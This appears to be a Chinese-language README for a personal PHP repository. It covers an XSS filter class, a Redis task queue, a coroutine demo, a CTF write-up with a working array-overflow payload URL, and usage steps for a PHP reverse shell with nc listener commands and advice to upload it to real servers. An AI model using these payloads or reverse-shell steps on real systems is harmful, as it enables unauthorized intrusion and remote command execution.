# PHP
### xsshtml.class.php   
#### filter xss php class 
Usage: 
```
<?php
require('xsshtml.class.php');
$html = '<html code>';
$xss = new XssHtml($html);
$html = $xss->getHtml();
?>
```

PHP Version > 5.0
IE7+ or other browser

### timeQueue.class.php   
#### 基于redis的定时任务
```
$obj = new timeQueue();
//添加任务并制定多少秒之后执行
$obj->add_task('test',[1,2],3);
$obj->add_task('demo',[1,2],2);
$obj->add_task('bug',[1,2],12);
$obj->add_task('test',[3,4],1);
$obj->add_task('test',[5,6],8);
//回调函数
$func = function ($args){
    var_dump($args);
};
//设置需要监听的任务
$obj->listen_task('test',$func);
$obj->listen_task('demo',$func);
//移除一个已经注册了的任务
$obj->remove_task('bug');
$obj->run();

---------------
在相应时间之后，相关事件开始运行

```

### PHP协程 coroutine.php
```
php coroutine.php
多任务调度器
task A 0
task BBB 0
task A 1
task BBB 1
task A 2
task BBB 2
task A 3
task BBB 3
task A 4
task BBB 4
task BBB 5
task BBB 6
task BBB 7
task BBB 8
task BBB 9
task BBB 10
task BBB 11
task BBB 12
task BBB 13
task BBB 14
两个任务是交替运行的, 而在第二个任务结束后, 只有第一个任务继续运行.
```


### 一道PHP CTF 题目 
```
<?php
include('config.php');
if(empty($_GET['user'])) die('exit');
$user = ['admin', 'password'];
if($_GET['user'] === $user && $_GET['user'][0] != 'admin'){
    echo $flag;
}
?>
<h3><?php echo $flag;?>

上面一段php程序，要求攻击者能够获得$flag即为成功
分析：
按照正常逻辑是无法获得flag的，but，php是一个神奇的语言。
官方曾发布过一个补丁：
https://bugs.php.net/bug.php?id=69892
问题就出在这儿：

测试： 
php -r "var_dump([0 => 0] === [0x100000000 => 0]);" 
bool(true)
返回了true，整形溢出
构造payload:
http://localhost/test.php?user[1]=password&user[4294967296]=admin
2^32 == 0x100000000 == 4294967296 所以是：user[4294967296]
所有条件均符合，flag获得，如下图：
```
![](https://github.com/LockGit/PHP/blob/master/ctf.jpeg)


### php-reverse-shell.php 一个反弹shell的php程序
```
终端1：
Mac环境：
➜  ~ nc -l -v -n 0 1234

Linux：
nc -v -n -l -p 1234


终端2：
---
注释：
$shell = 'uname -a; w; id; /bin/sh -i';
man sh
-i        If the -i option is present, the shell is interactive.
忘记了这个参数的作用了，sh -i 是激活交互的方式
---

执行：
	php php-reverse-shell.php
现实环境中上传shell后，访问让其运行即可
程序会fork一个子进程，并尝试连接某个ip的某个端口
测试时用的是本地的127.0.0.1 1234端口
➜  ~ php php-reverse-shell.php
Successfully opened reverse shell to 127.0.0.1:1234
➜  ~

此时终端1立即获得一个shell的交互界面，尝试去任意命运执行吧
```
